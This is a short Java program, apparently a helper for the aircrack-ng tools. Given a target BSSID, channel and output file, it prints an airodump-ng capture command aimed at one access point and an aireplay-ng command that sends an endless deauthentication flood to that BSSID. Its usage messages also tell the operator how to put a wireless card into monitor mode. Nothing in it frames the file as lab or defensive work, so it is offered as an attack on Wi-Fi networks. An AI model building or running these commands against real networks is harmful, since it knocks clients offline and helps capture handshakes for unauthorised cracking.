public class AircrackParser {

	public static void main(String[] args) {
		if (args.length != 3) {
			System.out.println("Did you start mon0? (airmon-ng start wlan0)");
			System.out.println("Did you dump all packets? (airodump-ng mon0)");
			System.out
					.println("Error: Usage: AircrackParser <bssid> <chan> <outfile>");

			System.exit(0);
		}
		String bssid = args[0];
		String chanNum = args[1];
		String outFile = args[2];
		System.out.println("airodump-ng -c " + chanNum + " -w " + outFile
				+ " --bssid " + bssid + " mon0");
		System.out.println("aireplay-ng -0 0 -a " + bssid + " mon0");
	}

}
